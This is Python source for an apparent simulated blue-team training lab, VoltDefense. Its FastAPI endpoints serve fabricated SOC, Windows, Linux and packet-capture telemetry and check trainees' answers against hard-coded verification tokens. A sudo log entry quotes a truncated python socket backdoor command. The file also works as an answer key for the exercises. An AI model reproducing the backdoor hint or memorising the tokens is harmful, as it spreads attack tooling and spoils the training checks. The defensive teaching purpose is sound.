        _DETECTION_WEB_RULES_SESSIONS[session_key] = {
            "web_detection_emulated": False,
            "urldecode_tuned": False,
            "web_detection_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_WEB_RULES_SESSIONS[session_key]


def get_detection_modsec_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_MODSEC_SESSIONS:
        _DETECTION_MODSEC_SESSIONS[session_key] = {
            "modsec_crs_emulated": False,
            "paranoia_tuned": False,
            "modsec_crs_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_MODSEC_SESSIONS[session_key]


def get_detection_wazuh_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_WAZUH_SESSIONS:
        _DETECTION_WAZUH_SESSIONS[session_key] = {
            "wazuh_rules_emulated": False,
            "decoder_regex_tuned": False,
            "wazuh_rules_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_WAZUH_SESSIONS[session_key]


def get_detection_false_positive_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_FALSE_POSITIVE_SESSIONS:
        _DETECTION_FALSE_POSITIVE_SESSIONS[session_key] = {
            "false_positive_emulated": False,
            "baseline_tuned": False,
            "false_positive_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_FALSE_POSITIVE_SESSIONS[session_key]


def get_detection_threshold_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_THRESHOLD_SESSIONS:
        _DETECTION_THRESHOLD_SESSIONS[session_key] = {
            "threshold_emulated": False,
            "window_tuned": False,
            "threshold_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_THRESHOLD_SESSIONS[session_key]


def get_detection_correlation_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_CORRELATION_SESSIONS:
        _DETECTION_CORRELATION_SESSIONS[session_key] = {
            "correlation_emulated": False,
            "sequence_tuned": False,
            "correlation_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_CORRELATION_SESSIONS[session_key]


def get_detection_unit_testing_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_UNIT_TESTING_SESSIONS:
        _DETECTION_UNIT_TESTING_SESSIONS[session_key] = {
            "unit_test_emulated": False,
            "fixtures_tuned": False,
            "unit_test_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_UNIT_TESTING_SESSIONS[session_key]


def get_detection_yara_hunting_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_YARA_HUNTING_SESSIONS:
        _DETECTION_YARA_HUNTING_SESSIONS[session_key] = {
            "yara_emulated": False,
            "condition_tuned": False,
            "yara_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_YARA_HUNTING_SESSIONS[session_key]


def get_detection_suricata_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_SURICATA_SESSIONS:
        _DETECTION_SURICATA_SESSIONS[session_key] = {
            "suricata_emulated": False,
            "pcre_tuned": False,
            "suricata_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_SURICATA_SESSIONS[session_key]


def get_detection_hunt_hypothesis_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_HUNT_HYPOTHESIS_SESSIONS:
        _DETECTION_HUNT_HYPOTHESIS_SESSIONS[session_key] = {
            "hunt_emulated": False,
            "hypothesis_tuned": False,
            "hunt_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_HUNT_HYPOTHESIS_SESSIONS[session_key]


def get_detection_pipeline_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_PIPELINE_SESSIONS:
        _DETECTION_PIPELINE_SESSIONS[session_key] = {
            "pipeline_emulated": False,
            "pipeline_tuned": False,
            "pipeline_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_PIPELINE_SESSIONS[session_key]


def get_detection_capstone_state(session_key: str) -> Dict[str, Any]:
    if not session_key:
        raise ValueError("session_key required")
    if session_key not in _DETECTION_CAPSTONE_SESSIONS:
        _DETECTION_CAPSTONE_SESSIONS[session_key] = {
            "capstone_emulated": False,
            "production_tuned": False,
            "capstone_validated": False,
            "emulation_data": {},
        }
    return _DETECTION_CAPSTONE_SESSIONS[session_key]


# Default compatibility wrappers
_SOC_STATE: Dict[str, Any] = {}
_WIN_STATE: Dict[str, Any] = {}
_LINUX_STATE: Dict[str, Any] = {}
_SIEM_STATE: Dict[str, Any] = {}
_BRUTEFORCE_STATE: Dict[str, Any] = {}
_MALWARE_STATE: Dict[str, Any] = {}
_PHISHING_STATE: Dict[str, Any] = {}
_ENDPOINT_STATE: Dict[str, Any] = {}
_NIDS_STATE: Dict[str, Any] = {}
_HUNT_STATE: Dict[str, Any] = {}
_TRIAGE_STATE: Dict[str, Any] = {}
_RESPONSE_STATE: Dict[str, Any] = {}
_FORENSICS_STATE: Dict[str, Any] = {}
_HARDENING_STATE: Dict[str, Any] = {}
_INTEL_STATE: Dict[str, Any] = {}
_BLUE_CAPSTONE_STATE: Dict[str, Any] = {}
_PURPLE_FOUNDATIONS_STATE: Dict[str, Any] = {}
_PURPLE_ATTCK_STATE: Dict[str, Any] = {}
_PURPLE_SIMULATION_STATE: Dict[str, Any] = {}
_PURPLE_RECON_STATE: Dict[str, Any] = {}
_PURPLE_PRIVESC_STATE: Dict[str, Any] = {}
_PURPLE_INJECTION_STATE: Dict[str, Any] = {}
_PURPLE_LATERAL_STATE: Dict[str, Any] = {}
_PURPLE_PERSIST_STATE: Dict[str, Any] = {}
_PURPLE_C2_STATE: Dict[str, Any] = {}
_PURPLE_EXFIL_STATE: Dict[str, Any] = {}
_PURPLE_RANSOMWARE_STATE: Dict[str, Any] = {}
_PURPLE_CLOUD_STATE: Dict[str, Any] = {}
_PURPLE_SUPPLY_CHAIN_STATE: Dict[str, Any] = {}
_PURPLE_API_ABUSE_STATE: Dict[str, Any] = {}
_PURPLE_AD_ATTACKS_STATE: Dict[str, Any] = {}
_PURPLE_CICD_STATE: Dict[str, Any] = {}
_PURPLE_EDR_BYPASS_STATE: Dict[str, Any] = {}
_PURPLE_HEATMAP_STATE: Dict[str, Any] = {}
_PURPLE_CONTINUOUS_VAL_STATE: Dict[str, Any] = {}
_PURPLE_CAPSTONE_STATE: Dict[str, Any] = {}


def reset_target_in_memory_states(session_key: Optional[str] = None):
    """Reset target in-memory states either for a specific session or globally."""
    registries = [
        _SOC_SESSIONS,
        _WIN_SESSIONS,
        _LINUX_SESSIONS,
        _TRAFFIC_SESSIONS,
        _WIRESHARK_SESSIONS,
        _LOG_SESSIONS,
        _SIEM_SESSIONS,
        _WIN_EVENT_SESSIONS,
        _BRUTEFORCE_SESSIONS,
        _MALWARE_SESSIONS,
        _PHISHING_SESSIONS,
        _ENDPOINT_SESSIONS,
        _NIDS_SESSIONS,
        _HUNT_SESSIONS,
        _TRIAGE_SESSIONS,
        _RESPONSE_SESSIONS,
        _FORENSICS_SESSIONS,
        _HARDENING_SESSIONS,
        _INTEL_SESSIONS,
        _BLUE_CAPSTONE_SESSIONS,
        _PURPLE_FOUNDATIONS_SESSIONS,
        _PURPLE_ATTCK_SESSIONS,
        _PURPLE_SIMULATION_SESSIONS,
        _PURPLE_RECON_SESSIONS,
        _PURPLE_PRIVESC_SESSIONS,
        _PURPLE_INJECTION_SESSIONS,
        _PURPLE_LATERAL_SESSIONS,
        _PURPLE_PERSIST_SESSIONS,
        _PURPLE_C2_SESSIONS,
        _PURPLE_EXFIL_SESSIONS,
        _PURPLE_RANSOMWARE_SESSIONS,
        _PURPLE_CLOUD_SESSIONS,
        _PURPLE_SUPPLY_CHAIN_SESSIONS,
        _PURPLE_API_ABUSE_SESSIONS,
        _PURPLE_AD_ATTACKS_SESSIONS,
        _PURPLE_CICD_SESSIONS,
        _PURPLE_EDR_BYPASS_SESSIONS,
        _PURPLE_HEATMAP_SESSIONS,
        _PURPLE_CONTINUOUS_VAL_SESSIONS,
        _PURPLE_CAPSTONE_SESSIONS,
        _DETECTION_FOUNDATIONS_SESSIONS,
        _DETECTION_NORMALIZATION_SESSIONS,
        _DETECTION_SIGMA_SYNTAX_SESSIONS,
        _DETECTION_PROCESS_CREATION_SESSIONS,
        _DETECTION_NETWORK_RULES_SESSIONS,
        _DETECTION_FILE_REGISTRY_SESSIONS,
        _DETECTION_AUTH_ABUSE_SESSIONS,
        _DETECTION_POWERSHELL_SESSIONS,
        _DETECTION_WEB_RULES_SESSIONS,
        _DETECTION_MODSEC_SESSIONS,
        _DETECTION_WAZUH_SESSIONS,
        _DETECTION_FALSE_POSITIVE_SESSIONS,
        _DETECTION_THRESHOLD_SESSIONS,
        _DETECTION_CORRELATION_SESSIONS,
        _DETECTION_UNIT_TESTING_SESSIONS,
        _DETECTION_YARA_HUNTING_SESSIONS,
        _DETECTION_SURICATA_SESSIONS,
        _DETECTION_HUNT_HYPOTHESIS_SESSIONS,
        _DETECTION_PIPELINE_SESSIONS,
        _DETECTION_CAPSTONE_SESSIONS,
    ]
    if session_key:
        for reg in registries:
            reg.pop(session_key, None)
    else:
        for reg in registries:
            reg.clear()


# ============================================================================
# BLUE ROOM 01: BLUE TEAM FOUNDATIONS & SOC OPERATIONS (PORT 8201)
# ============================================================================

soc_app = FastAPI(title="VoltDefense SOC Telemetry & SIEM Gateway")


@soc_app.api_route("/", methods=["GET", "HEAD"])
def soc_root():
    return {
        "service": "VoltDefense Security Operations Center (SOC) SIEM Gateway",
        "tier": "Tier 1 Triage & Event Stream",
        "endpoints": [
            "/api/soc/events",
            "/api/soc/alerts",
            "/api/soc/triage",
            "/challenge?stage=evidence",
            "/api/soc/remediate",
        ],
        "status": "OPERATIONAL",
    }


@soc_app.get("/api/soc/events")
def soc_get_events():
    events = [
        {
            "event_id": "EVT-1001",
            "timestamp": "2026-11-14T08:00:12Z",
            "host": "WS-FINANCE-04",
            "user": "jdoe",
            "event_type": "auth_success",
            "src_ip": "10.10.14.50",
            "severity": "INFORMATIONAL",
            "description": "Interactive user logon successful via Kerberos",
        },
        {
            "event_id": "EVT-1002",
            "timestamp": "2026-11-14T08:05:00Z",
            "host": "SRV-BACKUP-01",
            "user": "svc_backup",
            "event_type": "cron_run",
            "src_ip": "10.10.14.22",
            "severity": "INFORMATIONAL",
            "description": "Scheduled maintenance and ledger archive synchronization",
        },
        {
            "event_id": "EVT-1003",
            "timestamp": "2026-11-14T08:14:33Z",
            "host": "GATEWAY-AUTH-01",
            "user": "admin",
            "event_type": "auth_failed_burst",
            "src_ip": "198.51.100.42",
            "attempts": 52,
            "severity": "HIGH",
            "description": "Repeated failed authentication burst against external administrative gateway. Potential credential stuffing.",
        },
        {
            "event_id": "EVT-1004",
            "timestamp": "2026-11-14T08:18:05Z",
            "host": "DC-VOLT01",
            "user": "secadmin",
            "event_type": "token_manipulation",
            "src_ip": "10.10.14.90",
            "severity": "CRITICAL",
            "description": "LSASS memory handle opened with PROCESS_VM_READ permissions. Mimikatz signature detected.",
            "ioc_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        },
    ]
    return JSONResponse(events)


@soc_app.get("/api/soc/alerts")
def soc_get_alerts():
    return JSONResponse({
        "status": "SIEM_ALERT_FEED",
        "total_active_alerts": 2,
        "high_priority_alerts": [
            {
                "alert_id": "ALRT-9102",
                "rule": "RULE_AUTH_BURST_EXTERNAL",
                "source_ip": "198.51.100.42",
                "target_host": "GATEWAY-AUTH-01",
                "triggered_count": 52,
                "mitre_technique": "T1110.003 - Password Spraying",
                "severity": "HIGH",
            },
            {
                "alert_id": "ALRT-9103",
                "rule": "RULE_SUSPICIOUS_LSASS_ACCESS",
                "source_process": "unknown_mimikatz.exe",
                "target_process": "lsass.exe",
                "mitre_technique": "T1003.001 - OS Credential Dumping",
                "severity": "CRITICAL",
            },
        ],
    })


@soc_app.post("/api/soc/triage")
async def soc_triage(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        data = await request.json()
    except Exception:
        data = {}
    state = get_soc_state(sess_id)
    state["triaged_events"].append(data)
    event_id = str(data.get("event_id", "")).strip().upper()
    classification = str(data.get("classification", "")).strip().upper()
    severity = str(data.get("severity", "")).strip().upper()
    if event_id == "EVT-1003" and "TRUE_POSITIVE" in classification and severity in ["HIGH", "CRITICAL"]:
        return JSONResponse({
            "status": "TRIAGE_ACCEPTED",
            "ticket_id": "INC-2026-9901",
            "assigned_tier": "TIER_2_INCIDENT_RESPONSE",
            "classification": "CONFIRMED_TRUE_POSITIVE",
            "mitre_tactic": "TA0006 - Credential Access",
            "summary": "External IP 198.51.100.42 confirmed conducting distributed credential stuffing.",
            "verification_token": "TRIAGE_CONFIRMED_EVT1003_SECURE",
        })
    return JSONResponse({
        "status": "TRIAGE_REJECTED",
        "message": "Invalid triage parameters. Provide valid event_id, classification, and severity discovered from incident telemetry.",
    }, status_code=400)


@soc_app.get("/api/soc/triage")
def soc_triage_get():
    return JSONResponse({
        "status": "ERROR",
        "message": "Method Not Allowed. Triage requires a POST request with JSON payload containing event_id, classification, and severity.",
    }, status_code=405)


@soc_app.api_route("/challenge", methods=["GET", "POST"])
async def soc_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_soc_state(sess_id)
        if not state.get("triaged_events"):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisite incomplete: You must triage the alert via POST /api/soc/triage before verifying the attack timeline.",
            }, status_code=400)
        stage = str(body.get("stage", "")).lower()
        adversary = str(body.get("adversary_ip", "")).strip()
        host = str(body.get("compromised_host", "")).strip().upper()
        if (stage in ["evidence", "timeline"] or not stage) and adversary == "198.51.100.42" and host in ["DC-VOLT01", "DC-VOLT01.CORP.NOENTRY.LOCAL"]:
            state["timeline_verified"] = True
            return JSONResponse({
                "status": "TIMELINE_VERIFIED",
                "incident_sequence": [
                    {"step": 1, "time": "08:14:33Z", "event": "External auth burst detected from 198.51.100.42"},
                    {"step": 2, "time": "08:16:01Z", "event": "Single credential collision achieved for account admin"},
                    {"step": 3, "time": "08:18:05Z", "event": "LSASS handle injection observed on DC-VOLT01"},
                ],
                "verification_token": "TIMELINE_RECONSTRUCTED_DC_VOLT01",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid timeline parameters. Submitted findings do not match incident evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing stage, adversary_ip, and compromised_host discovered during your investigation.",
    })


@soc_app.post("/api/soc/remediate")
async def soc_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_soc_state(sess_id)
    state["remediated"] = True
    return JSONResponse({
        "status": "CONTAINMENT_ENFORCED",
        "actions": [
            "Perimeter firewall blacklisted malicious source IP 198.51.100.42.",
            "Compromised session tokens invalidated domain-wide.",
            "High-risk account 'admin' locked pending security review.",
        ],
        "verification_token": "CONTAINMENT_ENFORCED_IP_BLOCKED",
    })


@soc_app.get("/api/soc/remediate")
def soc_remediate_get():
    return JSONResponse({
        "status": "ERROR",
        "message": "Method Not Allowed. Containment requires a POST request.",
    }, status_code=405)


# ============================================================================
# BLUE ROOM 02: WINDOWS SECURITY FUNDAMENTALS (PORT 8202)
# ============================================================================

win_security_app = FastAPI(title="VoltDefense Windows Security Telemetry Lab")


@win_security_app.api_route("/", methods=["GET", "HEAD"])
def win_root():
    return {
        "service": "VoltDefense Windows Security Telemetry Lab",
        "host": "DC-VOLT01.corp.noentry.local",
        "domain": "CORP.NOENTRY.LOCAL",
        "endpoints": [
            "/api/windows/events/logon",
            "/api/windows/events/privileged",
            "/challenge?audit=privilege",
            "/api/windows/remediate",
        ],
        "documentation": "Simulated Windows Security Event Log telemetry repository (EVTX / JSON) for Security Operations training.",
    }


@win_security_app.get("/api/windows/events/logon")
def win_logon_events():
    events = [
        {
            "EventID": 4624,
            "TimeCreated": "2026-11-14T09:00:12.102Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC-VOLT01.corp.noentry.local",
            "TargetUserName": "Administrator",
            "TargetDomainName": "CORP",
            "LogonType": 2,
            "LogonTypeName": "Interactive (Console)",
            "IpAddress": "127.0.0.1",
        },
        {
            "EventID": 4624,
            "TimeCreated": "2026-11-14T09:12:44.891Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC-VOLT01.corp.noentry.local",
            "TargetUserName": "operator",
            "TargetDomainName": "CORP",
            "LogonType": 10,
            "LogonTypeName": "RemoteInteractive (RDP / Terminal Services)",
            "IpAddress": "10.10.14.2",
        },
        {
            "EventID": 4625,
            "TimeCreated": "2026-11-14T09:14:01.332Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC-VOLT01.corp.noentry.local",
            "TargetUserName": "admin",
            "Status": "0xC000006A",
            "FailureReason": "Unknown user name or bad password",
            "IpAddress": "198.51.100.42",
        },
    ]
    return JSONResponse(events)


@win_security_app.get("/api/windows/events/privileged")
def win_privileged_events():
    events = [
        {
            "EventID": 4720,
            "TimeCreated": "2026-11-14T09:20:15.412Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC-VOLT01.corp.noentry.local",
            "TargetUserName": "backdoor_admin",
            "Actor": "compromised_svc",
            "SamAccountName": "backdoor_admin",
            "Description": "A user account was created outside authorized change windows",
        },
        {
            "EventID": 4672,
            "TimeCreated": "2026-11-14T09:20:16.104Z",
            "Provider": "Microsoft-Windows-Security-Auditing",
            "Computer": "DC-VOLT01.corp.noentry.local",
            "TargetUserName": "backdoor_admin",
            "PrivilegeList": ["SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege"],
            "Description": "Special privileges assigned to new logon",
        },
    ]
    return JSONResponse(events)


@win_security_app.api_route("/challenge", methods=["GET", "POST"])
async def win_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_win_state(sess_id)
        target = str(body.get("audit_target", "")).strip().lower()
        priv = str(body.get("abused_privilege", "")).strip().lower()
        if target == "backdoor_admin" and priv in ["sedebugprivilege", "sedebug", "4672"]:
            state["privilege_audited"] = True
            return JSONResponse({
                "status": "WINDOWS_AUDIT_VERIFIED",
                "audit_target": target,
                "finding": "Rogue administrative account 'backdoor_admin' detected holding SeDebugPrivilege without Group Policy authorization.",
                "verification_token": "SEDEBUG_PRIVILEGE_AUDITED_CONFIRMED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid audit parameters. Submitted account or privilege does not match security event evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing audit_target and abused_privilege identified from event logs.",
    })


@win_security_app.post("/api/windows/remediate")
async def win_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_win_state(sess_id)
    if not state.get("privilege_audited"):
        return JSONResponse({
            "status": "REJECTED",
            "message": "Prerequisite incomplete: You must complete the privilege audit via POST /challenge before enforcing remediation.",
        }, status_code=400)
    state["remediated"] = True
    state["lockout_policy_enforced"] = True
    return JSONResponse({
        "status": "WINDOWS_ENVIRONMENT_HARDENED",
        "remediation_actions": [
            "Account 'backdoor_admin' disabled and deleted from SAM database.",
            "Account Lockout Threshold configured to 5 failed attempts with 30-minute lockout.",
            "SeDebugPrivilege revoked from non-builtin administrative principals.",
            "Windows Defender real-time tamper protection activated.",
        ],
        "verification_token": "LOCKOUT_POLICY_ENFORCED_5_ATTEMPTS",
    })


@win_security_app.get("/api/windows/remediate")
def win_remediate_get():
    return JSONResponse({
        "status": "ERROR",
        "message": "Method Not Allowed. Remediation requires a POST request.",
    }, status_code=405)


# ============================================================================
# BLUE ROOM 03: LINUX SECURITY MONITORING (PORT 8203)
# ============================================================================

linux_monitoring_app = FastAPI(title="VoltDefense Linux Security Monitoring Target")


@linux_monitoring_app.api_route("/", methods=["GET", "HEAD"])
def linux_root():
    return {
        "service": "VoltDefense Linux Security Monitoring Target",
        "log_path": "/var/log/auth.log",
        "status": "MONITORING_ACTIVE",
        "endpoints": [
            "/api/linux/logs/auth",
            "/api/linux/logs/sudo",
            "/challenge?audit=source_ip",
            "/api/linux/remediate",
        ],
    }


@linux_monitoring_app.get("/api/linux/logs/auth")
def linux_auth_logs():
    return JSONResponse({
        "log_file": "/var/log/auth.log",
        "service": "sshd",
        "alert": "Multiple failed SSH authentications from external adversary",
        "adversary_ip": "192.0.2.144",
        "total_failures": 48,
        "targeted_users": ["admin", "root", "guest", "oracle", "support"],
    })


@linux_monitoring_app.get("/api/linux/logs/sudo")
def linux_sudo_logs():
    return JSONResponse({
        "log_file": "/var/log/auth.log",
        "subsystem": "sudo",
        "incident": "Suspicious execution: operator executed python3 socket backdoor as root",
        "command": "/usr/bin/python3 -c import socket...",
    })


@linux_monitoring_app.api_route("/challenge", methods=["GET", "POST"])
async def linux_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_linux_state(sess_id)
        ip = str(body.get("attacker_ip", "")).strip()
        service = str(body.get("service", "")).strip().lower()
        if ip == "192.0.2.144" and service in ["sshd", "ssh"]:
            state["attribution_verified"] = True
            return JSONResponse({
                "status": "ATTRIBUTION_CONFIRMED",
                "attacker_ip": "192.0.2.144",
                "geolocation": "External Unallocated Subnet (TEST-NET-2)",
                "attack_pattern": "Automated SSH credential brute-force and dictionary attack",
                "verification_token": "ATTRIBUTION_CONFIRMED_192_0_2_144",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid attribution parameters. Submitted IP or service does not match authentication logs."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing attacker_ip and service identified from authentication logs.",
    })


@linux_monitoring_app.post("/api/linux/remediate")
async def linux_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_linux_state(sess_id)
    if not state.get("attribution_verified"):
        return JSONResponse({
            "status": "REJECTED",
            "message": "Prerequisite incomplete: You must complete threat actor attribution via POST /challenge before enforcing SSH/Fail2ban hardening.",
        }, status_code=400)
    state["remediated"] = True
    return JSONResponse({
        "status": "LINUX_HOST_HARDENED",
        "hardening_measures": [
            "PermitRootLogin configured to 'no' in /etc/ssh/sshd_config.",
            "PasswordAuthentication disabled; SSH key-based authentication enforced.",
            "fail2ban daemon enabled with 3-attempt jail on port 22.",
            "Permissive NOPASSWD sudoer rules revoked from non-admin groups.",
        ],
        "verification_token": "SSHD_HARDENED_FAIL2BAN_ENABLED",
    })


@linux_monitoring_app.get("/api/linux/remediate")
def linux_remediate_get():
    return JSONResponse({
        "status": "ERROR",
        "message": "Method Not Allowed. Remediation requires a POST request.",
    }, status_code=405)


# ============================================================================
# BLUE ROOM 04: NETWORK TRAFFIC ANALYSIS (PORT 8204)
# ============================================================================

traffic_app = FastAPI(title="VoltDefense Network Traffic Analysis Lab")

_TRAFFIC_STATE: Dict[str, Any] = {}


@traffic_app.api_route("/", methods=["GET", "HEAD"])
def traffic_root():
    return {
        "service": "VoltDefense Network Traffic Analysis Lab",
        "capture_file": "/home/operator/pcaps/incident_capture.pcap",
        "endpoints": [
            "/api/traffic/summary",
            "/api/traffic/dns",
            "/api/traffic/streams/http",
            "/challenge?stream=exfil",
            "/api/traffic/remediate",
        ],
    }


@traffic_app.get("/api/traffic/summary")
def traffic_summary():
    return JSONResponse({
        "status": "PCAP_ANALYSIS_SUMMARY",
        "capture_file": "incident_capture.pcap",
        "total_packets": 240,
        "protocol_hierarchy": {
            "Ethernet": "100%",
            "IPv4": "100%",
            "TCP": "65%",
            "HTTP": "20%",
            "UDP": "30%",
            "DNS": "30%",
            "ICMP": "5%",
        },
    })


@traffic_app.get("/api/traffic/dns")
@traffic_app.get("/api/traffic/dns-exfil")
def traffic_dns():
    return JSONResponse({
        "status": "DNS_TRAFFIC_TELEMETRY",
        "queries_captured": [
            {"query": "target.noentry.internal", "type": "A", "status": "LEGITIMATE"},
            {"query": "exfil-chunk-data.corp.noentry.internal", "type": "A", "status": "ANOMALOUS_DNS_TUNNELING"},
        ],
        "alert": "Excessive high-entropy subdomains detected indicating DNS exfiltration tunneling.",
    })


@traffic_app.get("/api/traffic/streams/http")
def traffic_http_stream():
    return JSONResponse({
        "status": "TCP_STREAM_RECONSTRUCTION",
        "stream_id": 3,
        "transport": "TCP",
        "src": "10.10.14.2:44812",
        "dst": "10.10.14.90:80",
        "data": "POST /api/login HTTP/1.1\r\nHost: target.noentry.internal\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&password=VoltSecret9921!",
        "vulnerability": "Cleartext HTTP authentication allows wire sniffing of credentials.",
    })


@traffic_app.api_route("/challenge", methods=["GET", "POST"])
async def traffic_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        covert = str(body.get("covert_channel", "")).lower()
        domain = str(body.get("tunnel_domain", "")).lower()
        if "dns" in covert and "exfil-chunk-data" in domain:
            return JSONResponse({
                "status": "STREAM_FORENSIC_CONFIRMED",
                "covert_channel": "DNS Query Subdomain Tunneling",
                "exfiltrated_data": "chunk_payload_01_ledger",
                "verification_token": "COVERT_CHANNEL_EXFIL_IDENTIFIED",
            })
        return JSONResponse({"status": "REJECTED", "message": "Invalid stream forensic parameters. Submitted covert channel or tunnel domain does not match PCAP evidence."}, status_code=400)
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with JSON payload containing covert_channel and tunnel_domain identified from packet analysis.",
    })


@traffic_app.post("/api/traffic/remediate")
async def traffic_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_traffic_state(sess_id)
    state["remediated"] = True
    return JSONResponse({
        "status": "NETWORK_TRAFFIC_HARDENED",
        "defensive_controls": [
            "Enforced strict HTTPS redirection with TLS 1.3 encryption (cleartext HTTP disabled).",
            "Configured DNS Sinkhole on corporate resolver for anomalous tunneling subdomains.",
            "Deployed Zeek network security monitoring sensor for real-time protocol anomaly detection.",
        ],
        "verification_token": "TLS_ENFORCED_DNS_SINKHOLED",
    })


@traffic_app.get("/api/traffic/remediate")
def traffic_remediate_get():
    return JSONResponse({
        "status": "ERROR",
        "message": "Method Not Allowed. Remediation requires a POST request.",
    }, status_code=405)


# ============================================================================
# BLUE ROOM 05: WIRESHARK FUNDAMENTALS & PACKET ANALYSIS (PORT 8205)
# ============================================================================

wireshark_lab_app = FastAPI(title="VoltDefense Wireshark Packet Analysis Gateway")

_WIRESHARK_STATE: Dict[str, Any] = {}

@wireshark_lab_app.api_route("/", methods=["GET", "HEAD"])
def wireshark_root():
    return {
        "service": "VoltDefense Wireshark Packet Analysis Lab",
        "description": "Network Packet Capture (.pcap) analysis engine and display filter evaluator.",
        "pcap_datasets": [
            "/home/operator/pcaps/lab_traffic.pcap",
            "/home/operator/pcaps/suspicious_http_dns.pcap",
        ],
        "endpoints": [
            "/api/wireshark/summary",
            "/api/wireshark/http",
            "/api/wireshark/dns",
            "/api/wireshark/handshake",
            "/challenge",
        ],
    }

@wireshark_lab_app.get("/api/wireshark/summary")
def wireshark_summary():
    return JSONResponse({
        "status": "PCAP_ANALYSIS_ACTIVE",
        "capture_file": "suspicious_http_dns.pcap",
        "total_packets": 128,
        "protocol_hierarchy": {
            "Frame": 128,
            "Ethernet": 128,
            "IPv4": 128,
            "TCP": 96,
            "HTTP": 24,
            "UDP": 32,
            "DNS": 32,
        },
        "display_filter_recommendations": [
            "tcp.flags.syn == 1 && tcp.flags.ack == 0",
            "http.request.method == \"POST\"",
            "dns.flags.response == 0",
            "ip.addr == 198.51.100.77",
        ],
    })

@wireshark_lab_app.get("/api/wireshark/http")
def wireshark_http_stream():
    return JSONResponse({
        "status": "HTTP_STREAM_DECODED",
        "stream_index": 2,
        "src": "10.10.14.2:51420",
        "dst": "10.10.14.90:80",
        "request": {
            "method": "POST",
            "uri": "/api/v1/telemetry",
            "host": "telemetry.corp.noentry.internal",
            "content_type": "application/json",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatSim/2.4",
            "body": "{\"device_id\": \"WS-FINANCE-09\", \"beacon_interval\": 60, \"auth_key\": \"VoltClientSecret9941\"}",
        },
        "response": {
            "status_code": 200,
            "server": "nginx/1.24.0",
            "body": "{\"status\": \"ACKNOWLEDGED\", \"next_interval\": 60}",
        },
    })

@wireshark_lab_app.get("/api/wireshark/dns")
def wireshark_dns_queries():
    return JSONResponse({
        "status": "DNS_QUERIES_DISSECTED",
        "queries": [
            {"id": "0x1a2b", "type": "A", "query_name": "target.noentry.internal", "resolved_ip": "10.10.14.90"},
